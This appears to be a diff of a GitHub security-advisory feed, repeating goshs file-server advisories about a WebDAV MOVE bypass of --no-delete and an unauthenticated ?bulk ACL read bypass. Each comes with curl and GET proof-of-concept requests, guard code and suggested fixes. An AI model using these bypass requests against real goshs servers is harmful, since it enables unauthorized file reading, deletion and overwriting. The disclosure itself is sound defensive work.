+<li><a href="https://vuldb.com/vuln/369120">https://vuldb.com/vuln/369120</a></li>
+<li><a href="https://vuldb.com/vuln/369120/cti">https://vuldb.com/vuln/369120/cti</a></li>
+<li><a href="https://github.com/advisories/GHSA-jqpm-wf57-qx5c">https://github.com/advisories/GHSA-jqpm-wf57-qx5c</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jqpm-wf57-qx5c</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-06-08T12:30:28.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[goshs.de/goshs] goshs has ACL Bypass & Path Traversal]]></title>
         <id>https://github.com/advisories/GHSA-964w-f6gj-5236</id>
@@ -447,612 +860,5 @@ case http.MethodDelete:
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-07-28T22:03:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[goshs.de/goshs] goshs --no-delete WebDAV MOVE bypass allows file deletion/overwrite]]></title>
-        <id>https://github.com/advisories/GHSA-hq33-8jgp-8qq3</id>
-        <link href="https://github.com/advisories/GHSA-hq33-8jgp-8qq3"/>
-        <updated>2026-07-28T22:03:13.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The WebDAV mode-flag guard added to fix GHSA-3whc-qvhv-xqjp still does not enforce <code>--no-delete</code> on the WebDAV <code>MOVE</code> verb. <code>MOVE</code> deletes the source file (rename removes it from its original path), and with <code>Overwrite: T</code> it additionally performs an explicit <code>RemoveAll</code> on the destination. Under <code>-w --no-delete</code>, <code>DELETE</code> is correctly blocked (403) but <code>MOVE</code> still destroys existing files, defeating the documented "Disable the delete option" boundary.</p>
-<p>This is a residual of the parent fix: the guard classifies <code>MOVE</code>/<code>COPY</code> as write-only verbs (blocked only under <code>--read-only</code>) and never treats <code>MOVE</code> as a delete, so the <code>--no-delete</code> branch never covers it.</p>
-<h2 id="affected">Affected</h2>
-<p>goshs v2.1.3 (current release, commit <code>ba00ce3</code>). The guard was introduced when GHSA-3whc-qvhv-xqjp was fixed and carries the gap forward.</p>
-<h2 id="details">Details</h2>
-<p><code>httpserver/server.go</code>, <code>wdGuard</code> (lines 237-254):</p>
-<pre><code class="language-go">wdGuard := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-    switch r.Method {
-    case http.MethodPut, "MKCOL", "MOVE", "COPY":
-        if fs.ReadOnly {
-            http.Error(w, "read-only", http.StatusForbidden)
-            return
-        }
-    case http.MethodDelete:
-        if fs.ReadOnly || fs.UploadOnly || fs.NoDelete {
-            http.Error(w, "delete disabled", http.StatusForbidden)
-            return
-        }
-    case http.MethodGet, http.MethodHead:
-        if fs.UploadOnly {
-            http.Error(w, "upload-only", http.StatusForbidden)
-            return
-        }
-    }
-    ...
-</code></pre>
-<p><code>MOVE</code> lives in the first case and is gated only by <code>fs.ReadOnly</code>. It is never checked against <code>fs.NoDelete</code>. But <code>MOVE</code> in <code>golang.org/x/net/webdav</code> (<code>file.go</code>, <code>moveFiles</code>) calls <code>fs.Rename(ctx, src, dst)</code>, which removes the source from its original location, and when the <code>Overwrite: T</code> header is present it first calls <code>fs.RemoveAll(ctx, dst)</code> on an existing destination. Both are deletions. So <code>--no-delete</code>, whose help text reads "Disable the delete option", does not disable deletion via <code>MOVE</code>.</p>
-<p>The <code>.goshs</code> ACL layer (<code>webdav_acl.go</code>) checks auth and block-lists only; it does not enforce the mode flags, so it does not close this gap.</p>
-<h2 id="proof-of-concept">Proof of concept</h2>
-<p>Reproduced live against goshs v2.1.3 on 2026-07-02. Server started with <code>--no-delete</code> and WebDAV enabled:</p>
-<pre><code>$ printf 'TOP-SECRET-CONTENTS\n' &gt; webroot/secret.txt
-$ printf 'VICTIM-EXISTING-FILE\n'  &gt; webroot/victim.txt
-$ goshs -d webroot -i 127.0.0.1 -p 18080 --webdav --webdav-port 18081 --no-delete
-INFO  Serving WEBDAV on 127.0.0.1:18081 from webroot
-</code></pre>
-<p>Control - DELETE is correctly blocked:</p>
-<pre><code>$ curl -s -i -X DELETE http://127.0.0.1:18081/secret.txt
-HTTP/1.1 403 Forbidden
-Content-Type: text/plain; charset=utf-8
-Server: goshs/v2.1.3 (darwin; go1.26.1)
-</code></pre>
-<p>secret.txt still exists on disk.</p>
-<p>Bypass 1 - MOVE removes the source file despite --no-delete:</p>
-<pre><code>$ curl -s -i -X MOVE -H 'Destination: http://127.0.0.1:18081/gone.txt' http://127.0.0.1:18081/secret.txt
-HTTP/1.1 201 Created
-Server: goshs/v2.1.3 (darwin; go1.26.1)
-</code></pre>
-<p>secret.txt is now deleted from disk (its content is at gone.txt).</p>
-<p>Bypass 2 - MOVE with Overwrite:T destroys an existing victim file:</p>
-<pre><code># before: victim.txt = VICTIM-EXISTING-FILE
-$ curl -s -i -X MOVE -H 'Destination: http://127.0.0.1:18081/victim.txt' -H 'Overwrite: T' http://127.0.0.1:18081/gone.txt
-HTTP/1.1 204 No Content
-Server: goshs/v2.1.3 (darwin; go1.26.1)
-# after:  victim.txt = TOP-SECRET-CONTENTS   (original VICTIM-EXISTING-FILE destroyed via RemoveAll)
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An operator running <code>goshs -w --no-delete -d /srv/artifacts</code> to deliver files that must not be removed still allows any WebDAV client to delete or clobber existing files via <code>MOVE</code>. Confidential existing files can be renamed away or overwritten. The <code>--no-delete</code> control is silently ineffective on the WebDAV port for the <code>MOVE</code> verb.</p>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p>Move <code>MOVE</code> (and <code>COPY</code> on collision-with-overwrite, which also deletes) into the delete-gated branch, or add <code>fs.NoDelete</code> to the write-verb branch for <code>MOVE</code>:</p>
-<pre><code class="language-go">case http.MethodPut, "MKCOL", "COPY":
-    if fs.ReadOnly {
-        http.Error(w, "read-only", http.StatusForbidden)
-        return
-    }
-case "MOVE":
-    // MOVE renames (deletes source) and, with Overwrite:T, RemoveAll(dst).
-    if fs.ReadOnly || fs.UploadOnly || fs.NoDelete {
-        http.Error(w, "move disabled", http.StatusForbidden)
-        return
-    }
-case http.MethodDelete:
-    if fs.ReadOnly || fs.UploadOnly || fs.NoDelete {
-        http.Error(w, "delete disabled", http.StatusForbidden)
-        return
-    }
-</code></pre>
-<p>Add an integration test covering <code>MOVE</code> under <code>--no-delete</code> (the current <code>testWebdavMoveCopy</code> only exercises MOVE/COPY in unrestricted mode).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/goshs-labs/goshs/security/advisories/GHSA-hq33-8jgp-8qq3">https://github.com/goshs-labs/goshs/security/advisories/GHSA-hq33-8jgp-8qq3</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/commit/0444ac6b1a8176ddae70d940adf7a26b2e5a6c29">https://github.com/goshs-labs/goshs/commit/0444ac6b1a8176ddae70d940adf7a26b2e5a6c29</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/releases/tag/v2.1.4">https://github.com/goshs-labs/goshs/releases/tag/v2.1.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-hq33-8jgp-8qq3">https://github.com/advisories/GHSA-hq33-8jgp-8qq3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hq33-8jgp-8qq3</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-28T22:03:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/patrickhener/goshs/v2] goshs --no-delete WebDAV MOVE bypass allows file deletion/overwrite]]></title>
-        <id>https://github.com/advisories/GHSA-hq33-8jgp-8qq3</id>
-        <link href="https://github.com/advisories/GHSA-hq33-8jgp-8qq3"/>
-        <updated>2026-07-28T22:03:13.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The WebDAV mode-flag guard added to fix GHSA-3whc-qvhv-xqjp still does not enforce <code>--no-delete</code> on the WebDAV <code>MOVE</code> verb. <code>MOVE</code> deletes the source file (rename removes it from its original path), and with <code>Overwrite: T</code> it additionally performs an explicit <code>RemoveAll</code> on the destination. Under <code>-w --no-delete</code>, <code>DELETE</code> is correctly blocked (403) but <code>MOVE</code> still destroys existing files, defeating the documented "Disable the delete option" boundary.</p>
-<p>This is a residual of the parent fix: the guard classifies <code>MOVE</code>/<code>COPY</code> as write-only verbs (blocked only under <code>--read-only</code>) and never treats <code>MOVE</code> as a delete, so the <code>--no-delete</code> branch never covers it.</p>
-<h2 id="affected">Affected</h2>
-<p>goshs v2.1.3 (current release, commit <code>ba00ce3</code>). The guard was introduced when GHSA-3whc-qvhv-xqjp was fixed and carries the gap forward.</p>
-<h2 id="details">Details</h2>
-<p><code>httpserver/server.go</code>, <code>wdGuard</code> (lines 237-254):</p>
-<pre><code class="language-go">wdGuard := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-    switch r.Method {
-    case http.MethodPut, "MKCOL", "MOVE", "COPY":
-        if fs.ReadOnly {
-            http.Error(w, "read-only", http.StatusForbidden)
-            return
-        }
-    case http.MethodDelete:
-        if fs.ReadOnly || fs.UploadOnly || fs.NoDelete {
-            http.Error(w, "delete disabled", http.StatusForbidden)
-            return
-        }
-    case http.MethodGet, http.MethodHead:
-        if fs.UploadOnly {
-            http.Error(w, "upload-only", http.StatusForbidden)
-            return
-        }
-    }
-    ...
-</code></pre>
-<p><code>MOVE</code> lives in the first case and is gated only by <code>fs.ReadOnly</code>. It is never checked against <code>fs.NoDelete</code>. But <code>MOVE</code> in <code>golang.org/x/net/webdav</code> (<code>file.go</code>, <code>moveFiles</code>) calls <code>fs.Rename(ctx, src, dst)</code>, which removes the source from its original location, and when the <code>Overwrite: T</code> header is present it first calls <code>fs.RemoveAll(ctx, dst)</code> on an existing destination. Both are deletions. So <code>--no-delete</code>, whose help text reads "Disable the delete option", does not disable deletion via <code>MOVE</code>.</p>
-<p>The <code>.goshs</code> ACL layer (<code>webdav_acl.go</code>) checks auth and block-lists only; it does not enforce the mode flags, so it does not close this gap.</p>
-<h2 id="proof-of-concept">Proof of concept</h2>
-<p>Reproduced live against goshs v2.1.3 on 2026-07-02. Server started with <code>--no-delete</code> and WebDAV enabled:</p>
-<pre><code>$ printf 'TOP-SECRET-CONTENTS\n' &gt; webroot/secret.txt
-$ printf 'VICTIM-EXISTING-FILE\n'  &gt; webroot/victim.txt
-$ goshs -d webroot -i 127.0.0.1 -p 18080 --webdav --webdav-port 18081 --no-delete
-INFO  Serving WEBDAV on 127.0.0.1:18081 from webroot
-</code></pre>
-<p>Control - DELETE is correctly blocked:</p>
-<pre><code>$ curl -s -i -X DELETE http://127.0.0.1:18081/secret.txt
-HTTP/1.1 403 Forbidden
-Content-Type: text/plain; charset=utf-8
-Server: goshs/v2.1.3 (darwin; go1.26.1)
-</code></pre>
-<p>secret.txt still exists on disk.</p>
-<p>Bypass 1 - MOVE removes the source file despite --no-delete:</p>
-<pre><code>$ curl -s -i -X MOVE -H 'Destination: http://127.0.0.1:18081/gone.txt' http://127.0.0.1:18081/secret.txt
-HTTP/1.1 201 Created
-Server: goshs/v2.1.3 (darwin; go1.26.1)
-</code></pre>
-<p>secret.txt is now deleted from disk (its content is at gone.txt).</p>
-<p>Bypass 2 - MOVE with Overwrite:T destroys an existing victim file:</p>
-<pre><code># before: victim.txt = VICTIM-EXISTING-FILE
-$ curl -s -i -X MOVE -H 'Destination: http://127.0.0.1:18081/victim.txt' -H 'Overwrite: T' http://127.0.0.1:18081/gone.txt
-HTTP/1.1 204 No Content
-Server: goshs/v2.1.3 (darwin; go1.26.1)
-# after:  victim.txt = TOP-SECRET-CONTENTS   (original VICTIM-EXISTING-FILE destroyed via RemoveAll)
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An operator running <code>goshs -w --no-delete -d /srv/artifacts</code> to deliver files that must not be removed still allows any WebDAV client to delete or clobber existing files via <code>MOVE</code>. Confidential existing files can be renamed away or overwritten. The <code>--no-delete</code> control is silently ineffective on the WebDAV port for the <code>MOVE</code> verb.</p>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p>Move <code>MOVE</code> (and <code>COPY</code> on collision-with-overwrite, which also deletes) into the delete-gated branch, or add <code>fs.NoDelete</code> to the write-verb branch for <code>MOVE</code>:</p>
-<pre><code class="language-go">case http.MethodPut, "MKCOL", "COPY":
-    if fs.ReadOnly {
-        http.Error(w, "read-only", http.StatusForbidden)
-        return
-    }
-case "MOVE":
-    // MOVE renames (deletes source) and, with Overwrite:T, RemoveAll(dst).
-    if fs.ReadOnly || fs.UploadOnly || fs.NoDelete {
-        http.Error(w, "move disabled", http.StatusForbidden)
-        return
-    }
-case http.MethodDelete:
-    if fs.ReadOnly || fs.UploadOnly || fs.NoDelete {
-        http.Error(w, "delete disabled", http.StatusForbidden)
-        return
-    }
-</code></pre>
-<p>Add an integration test covering <code>MOVE</code> under <code>--no-delete</code> (the current <code>testWebdavMoveCopy</code> only exercises MOVE/COPY in unrestricted mode).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/goshs-labs/goshs/security/advisories/GHSA-hq33-8jgp-8qq3">https://github.com/goshs-labs/goshs/security/advisories/GHSA-hq33-8jgp-8qq3</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/commit/0444ac6b1a8176ddae70d940adf7a26b2e5a6c29">https://github.com/goshs-labs/goshs/commit/0444ac6b1a8176ddae70d940adf7a26b2e5a6c29</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/releases/tag/v2.1.4">https://github.com/goshs-labs/goshs/releases/tag/v2.1.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-hq33-8jgp-8qq3">https://github.com/advisories/GHSA-hq33-8jgp-8qq3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hq33-8jgp-8qq3</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-28T22:03:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[goshs.de/goshs/v2] goshs --no-delete WebDAV MOVE bypass allows file deletion/overwrite]]></title>
-        <id>https://github.com/advisories/GHSA-hq33-8jgp-8qq3</id>
-        <link href="https://github.com/advisories/GHSA-hq33-8jgp-8qq3"/>
-        <updated>2026-07-28T22:03:13.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The WebDAV mode-flag guard added to fix GHSA-3whc-qvhv-xqjp still does not enforce <code>--no-delete</code> on the WebDAV <code>MOVE</code> verb. <code>MOVE</code> deletes the source file (rename removes it from its original path), and with <code>Overwrite: T</code> it additionally performs an explicit <code>RemoveAll</code> on the destination. Under <code>-w --no-delete</code>, <code>DELETE</code> is correctly blocked (403) but <code>MOVE</code> still destroys existing files, defeating the documented "Disable the delete option" boundary.</p>
-<p>This is a residual of the parent fix: the guard classifies <code>MOVE</code>/<code>COPY</code> as write-only verbs (blocked only under <code>--read-only</code>) and never treats <code>MOVE</code> as a delete, so the <code>--no-delete</code> branch never covers it.</p>
-<h2 id="affected">Affected</h2>
-<p>goshs v2.1.3 (current release, commit <code>ba00ce3</code>). The guard was introduced when GHSA-3whc-qvhv-xqjp was fixed and carries the gap forward.</p>
-<h2 id="details">Details</h2>
-<p><code>httpserver/server.go</code>, <code>wdGuard</code> (lines 237-254):</p>
-<pre><code class="language-go">wdGuard := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-    switch r.Method {
-    case http.MethodPut, "MKCOL", "MOVE", "COPY":
-        if fs.ReadOnly {
-            http.Error(w, "read-only", http.StatusForbidden)
-            return
-        }
-    case http.MethodDelete:
-        if fs.ReadOnly || fs.UploadOnly || fs.NoDelete {
-            http.Error(w, "delete disabled", http.StatusForbidden)
-            return
-        }
-    case http.MethodGet, http.MethodHead:
-        if fs.UploadOnly {
-            http.Error(w, "upload-only", http.StatusForbidden)
-            return
-        }
-    }
-    ...
-</code></pre>
-<p><code>MOVE</code> lives in the first case and is gated only by <code>fs.ReadOnly</code>. It is never checked against <code>fs.NoDelete</code>. But <code>MOVE</code> in <code>golang.org/x/net/webdav</code> (<code>file.go</code>, <code>moveFiles</code>) calls <code>fs.Rename(ctx, src, dst)</code>, which removes the source from its original location, and when the <code>Overwrite: T</code> header is present it first calls <code>fs.RemoveAll(ctx, dst)</code> on an existing destination. Both are deletions. So <code>--no-delete</code>, whose help text reads "Disable the delete option", does not disable deletion via <code>MOVE</code>.</p>
-<p>The <code>.goshs</code> ACL layer (<code>webdav_acl.go</code>) checks auth and block-lists only; it does not enforce the mode flags, so it does not close this gap.</p>
-<h2 id="proof-of-concept">Proof of concept</h2>
-<p>Reproduced live against goshs v2.1.3 on 2026-07-02. Server started with <code>--no-delete</code> and WebDAV enabled:</p>
-<pre><code>$ printf 'TOP-SECRET-CONTENTS\n' &gt; webroot/secret.txt
-$ printf 'VICTIM-EXISTING-FILE\n'  &gt; webroot/victim.txt
-$ goshs -d webroot -i 127.0.0.1 -p 18080 --webdav --webdav-port 18081 --no-delete
-INFO  Serving WEBDAV on 127.0.0.1:18081 from webroot
-</code></pre>
-<p>Control - DELETE is correctly blocked:</p>
-<pre><code>$ curl -s -i -X DELETE http://127.0.0.1:18081/secret.txt
-HTTP/1.1 403 Forbidden
-Content-Type: text/plain; charset=utf-8
-Server: goshs/v2.1.3 (darwin; go1.26.1)
-</code></pre>
-<p>secret.txt still exists on disk.</p>
-<p>Bypass 1 - MOVE removes the source file despite --no-delete:</p>
-<pre><code>$ curl -s -i -X MOVE -H 'Destination: http://127.0.0.1:18081/gone.txt' http://127.0.0.1:18081/secret.txt
-HTTP/1.1 201 Created
-Server: goshs/v2.1.3 (darwin; go1.26.1)
-</code></pre>
-<p>secret.txt is now deleted from disk (its content is at gone.txt).</p>
-<p>Bypass 2 - MOVE with Overwrite:T destroys an existing victim file:</p>
-<pre><code># before: victim.txt = VICTIM-EXISTING-FILE
-$ curl -s -i -X MOVE -H 'Destination: http://127.0.0.1:18081/victim.txt' -H 'Overwrite: T' http://127.0.0.1:18081/gone.txt
-HTTP/1.1 204 No Content
-Server: goshs/v2.1.3 (darwin; go1.26.1)
-# after:  victim.txt = TOP-SECRET-CONTENTS   (original VICTIM-EXISTING-FILE destroyed via RemoveAll)
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An operator running <code>goshs -w --no-delete -d /srv/artifacts</code> to deliver files that must not be removed still allows any WebDAV client to delete or clobber existing files via <code>MOVE</code>. Confidential existing files can be renamed away or overwritten. The <code>--no-delete</code> control is silently ineffective on the WebDAV port for the <code>MOVE</code> verb.</p>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p>Move <code>MOVE</code> (and <code>COPY</code> on collision-with-overwrite, which also deletes) into the delete-gated branch, or add <code>fs.NoDelete</code> to the write-verb branch for <code>MOVE</code>:</p>
-<pre><code class="language-go">case http.MethodPut, "MKCOL", "COPY":
-    if fs.ReadOnly {
-        http.Error(w, "read-only", http.StatusForbidden)
-        return
-    }
-case "MOVE":
-    // MOVE renames (deletes source) and, with Overwrite:T, RemoveAll(dst).
-    if fs.ReadOnly || fs.UploadOnly || fs.NoDelete {
-        http.Error(w, "move disabled", http.StatusForbidden)
-        return
-    }
-case http.MethodDelete:
-    if fs.ReadOnly || fs.UploadOnly || fs.NoDelete {
-        http.Error(w, "delete disabled", http.StatusForbidden)
-        return
-    }
-</code></pre>
-<p>Add an integration test covering <code>MOVE</code> under <code>--no-delete</code> (the current <code>testWebdavMoveCopy</code> only exercises MOVE/COPY in unrestricted mode).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/goshs-labs/goshs/security/advisories/GHSA-hq33-8jgp-8qq3">https://github.com/goshs-labs/goshs/security/advisories/GHSA-hq33-8jgp-8qq3</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/commit/0444ac6b1a8176ddae70d940adf7a26b2e5a6c29">https://github.com/goshs-labs/goshs/commit/0444ac6b1a8176ddae70d940adf7a26b2e5a6c29</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/releases/tag/v2.1.4">https://github.com/goshs-labs/goshs/releases/tag/v2.1.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-hq33-8jgp-8qq3">https://github.com/advisories/GHSA-hq33-8jgp-8qq3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hq33-8jgp-8qq3</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-28T22:03:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[goshs.de/goshs/v2] goshs: File-based .goshs ACL authorization bypass via the ?bulk zip-download route (unauthenticated read; residual of GHSA-wvhv-qcqf-f3cx)]]></title>
-        <id>https://github.com/advisories/GHSA-rmxw-pq4x-3fvh</id>
-        <link href="https://github.com/advisories/GHSA-rmxw-pq4x-3fvh"/>
-        <updated>2026-07-28T21:59:49.000Z</updated>
-        <content type="html"><![CDATA[<p>GHSA-wvhv-qcqf-f3cx fixed the per-folder .goshs ACL bypass on the state-changing routes (PUT/POST upload/?mkdir/?delete) and added recursive ACL resolution, and its description states the read/list path correctly enforces .goshs. That premise does not hold for the ?bulk zip-download route. bulkDownload (httpserver/updown.go) takes one or more ?file= parameters, runs each through sanitizePath(fs.Webroot, file), and streams the contents back as a ZIP without ever calling findEffectiveACL/applyCustomAuth. It is dispatched from earlyBreakParameters (?bulk) before the normal doDir/doFile/sendFile flow that performs the ACL check. An unauthenticated attacker can therefore read any file under the webroot protected solely by a .goshs ACL, bypassing both the folder auth (401 on the normal path) and the per-file block list (404 on the normal path). Same authorization-inconsistency root cause as the original advisory, surviving on a read route the fix did not cover.</p>
-<p>Proof of concept (live, against the fixed v2.1.0 build which includes fix commit f212c4f4, served with no global -b auth, only a per-folder .goshs):
-  GET /protected/secret.txt              -&gt; 401 (ACL enforced on normal path)
-  GET /protected/secret.txt -u admin:admin -&gt; 200
-  GET /?bulk&amp;file=/protected/secret.txt  -&gt; 200, zip contains the protected file contents  (BYPASS)
-  GET /?bulk&amp;file=/protected/blocked.txt -&gt; 200, zip contains the block-listed file        (block bypass)
-  GET /protected/secret.txt?share        -&gt; 403 'Sharing disabled when auth is disabled'    (correctly gated, NOT a bypass)</p>
-<p>Impact: any unauthenticated network attacker can read files an operator protected with the documented per-folder .goshs ACL/basic-auth feature, by requesting them through ?bulk. Confidentiality only (the write/delete equivalents were closed by GHSA-wvhv-qcqf-f3cx). Applies to deployments relying on .goshs as the access boundary (a server-wide -b basic auth, if configured, also gates ?bulk via its middleware).</p>
-<p>Remediation: enforce the effective .goshs ACL inside bulkDownload for every requested file exactly as sendFile/processDir do (resolve findEffectiveACL(filepath.Dir(absPath)) + applyCustomAuth + honor acl.Block), or route ?bulk through the same authorization gate as the normal read path. Audit ?cbDown and other alternate read routes for the same gap.</p>
-<p>Credit: anir0y (independent security research).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/goshs-labs/goshs/security/advisories/GHSA-rmxw-pq4x-3fvh">https://github.com/goshs-labs/goshs/security/advisories/GHSA-rmxw-pq4x-3fvh</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/commit/7cf911a26ace737e1a55b7dc073e307a25f7fd1d">https://github.com/goshs-labs/goshs/commit/7cf911a26ace737e1a55b7dc073e307a25f7fd1d</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/releases/tag/v2.1.1">https://github.com/goshs-labs/goshs/releases/tag/v2.1.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-rmxw-pq4x-3fvh">https://github.com/advisories/GHSA-rmxw-pq4x-3fvh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rmxw-pq4x-3fvh</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-28T21:59:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[goshs.de/goshs] goshs: File-based .goshs ACL authorization bypass via the ?bulk zip-download route (unauthenticated read; residual of GHSA-wvhv-qcqf-f3cx)]]></title>
-        <id>https://github.com/advisories/GHSA-rmxw-pq4x-3fvh</id>
-        <link href="https://github.com/advisories/GHSA-rmxw-pq4x-3fvh"/>
-        <updated>2026-07-28T21:59:49.000Z</updated>
-        <content type="html"><![CDATA[<p>GHSA-wvhv-qcqf-f3cx fixed the per-folder .goshs ACL bypass on the state-changing routes (PUT/POST upload/?mkdir/?delete) and added recursive ACL resolution, and its description states the read/list path correctly enforces .goshs. That premise does not hold for the ?bulk zip-download route. bulkDownload (httpserver/updown.go) takes one or more ?file= parameters, runs each through sanitizePath(fs.Webroot, file), and streams the contents back as a ZIP without ever calling findEffectiveACL/applyCustomAuth. It is dispatched from earlyBreakParameters (?bulk) before the normal doDir/doFile/sendFile flow that performs the ACL check. An unauthenticated attacker can therefore read any file under the webroot protected solely by a .goshs ACL, bypassing both the folder auth (401 on the normal path) and the per-file block list (404 on the normal path). Same authorization-inconsistency root cause as the original advisory, surviving on a read route the fix did not cover.</p>
-<p>Proof of concept (live, against the fixed v2.1.0 build which includes fix commit f212c4f4, served with no global -b auth, only a per-folder .goshs):
-  GET /protected/secret.txt              -&gt; 401 (ACL enforced on normal path)
-  GET /protected/secret.txt -u admin:admin -&gt; 200
-  GET /?bulk&amp;file=/protected/secret.txt  -&gt; 200, zip contains the protected file contents  (BYPASS)
-  GET /?bulk&amp;file=/protected/blocked.txt -&gt; 200, zip contains the block-listed file        (block bypass)
-  GET /protected/secret.txt?share        -&gt; 403 'Sharing disabled when auth is disabled'    (correctly gated, NOT a bypass)</p>
-<p>Impact: any unauthenticated network attacker can read files an operator protected with the documented per-folder .goshs ACL/basic-auth feature, by requesting them through ?bulk. Confidentiality only (the write/delete equivalents were closed by GHSA-wvhv-qcqf-f3cx). Applies to deployments relying on .goshs as the access boundary (a server-wide -b basic auth, if configured, also gates ?bulk via its middleware).</p>
-<p>Remediation: enforce the effective .goshs ACL inside bulkDownload for every requested file exactly as sendFile/processDir do (resolve findEffectiveACL(filepath.Dir(absPath)) + applyCustomAuth + honor acl.Block), or route ?bulk through the same authorization gate as the normal read path. Audit ?cbDown and other alternate read routes for the same gap.</p>
-<p>Credit: anir0y (independent security research).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/goshs-labs/goshs/security/advisories/GHSA-rmxw-pq4x-3fvh">https://github.com/goshs-labs/goshs/security/advisories/GHSA-rmxw-pq4x-3fvh</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/commit/7cf911a26ace737e1a55b7dc073e307a25f7fd1d">https://github.com/goshs-labs/goshs/commit/7cf911a26ace737e1a55b7dc073e307a25f7fd1d</a></li>
-<li><a href="https://github.com/goshs-labs/goshs/releases/tag/v2.1.1">https://github.com/goshs-labs/goshs/releases/tag/v2.1.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-rmxw-pq4x-3fvh">https://github.com/advisories/GHSA-rmxw-pq4x-3fvh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rmxw-pq4x-3fvh</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-28T21:59:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/patrickhener/goshs/v2] goshs: File-based .goshs ACL authorization bypass via the ?bulk zip-download route (unauthenticated read; residual of GHSA-wvhv-qcqf-f3cx)]]></title>
-        <id>https://github.com/advisories/GHSA-rmxw-pq4x-3fvh</id>
-        <link href="https://github.com/advisories/GHSA-rmxw-pq4x-3fvh"/>
-        <updated>2026-07-28T21:59:49.000Z</updated>
-        <content type="html"><![CDATA[<p>GHSA-wvhv-qcqf-f3cx fixed the per-folder .goshs ACL bypass on the state-changing routes (PUT/POST upload/?mkdir/?delete) and added recursive ACL resolution, and its description states the read/list path correctly enforces .goshs. That premise does not hold for the ?bulk zip-download route. bulkDownload (httpserver/updown.go) takes one or more ?file= parameters, runs each through sanitizePath(fs.Webroot, file), and streams the contents back as a ZIP without ever calling findEffectiveACL/applyCustomAuth. It is dispatched from earlyBreakParameters (?bulk) before the normal doDir/doFile/sendFile flow that performs the ACL check. An unauthenticated attacker can therefore read any file under the webroot protected solely by a .goshs ACL, bypassing both the folder auth (401 on the normal path) and the per-file block list (404 on the normal path). Same authorization-inconsistency root cause as the original advisory, surviving on a read route the fix did not cover.</p>
-<p>Proof of concept (live, against the fixed v2.1.0 build which includes fix commit f212c4f4, served with no global -b auth, only a per-folder .goshs):
-  GET /protected/secret.txt              -&gt; 401 (ACL enforced on normal path)
-  GET /protected/secret.txt -u admin:admin -&gt; 200
-  GET /?bulk&amp;file=/protected/secret.txt  -&gt; 200, zip contains the protected file contents  (BYPASS)
-  GET /?bulk&amp;file=/protected/blocked.txt -&gt; 200, zip contains the block-listed file        (block bypass)
-  GET /protected/secret.txt?share        -&gt; 403 'Sharing disabled when auth is disabled'    (correctly gated, NOT a bypass)</p>
-<p>Impact: any unauthenticated network attacker can read files an operator protected with the documented per-folder .goshs ACL/basic-auth feature, by requesting them through ?bulk. Confidentiality only (the write/delete equivalents were closed by GHSA-wvhv-qcqf-f3cx). Applies to deployments relying on .goshs as the access boundary (a server-wide -b basic auth, if configured, also gates ?bulk via its middleware).</p>
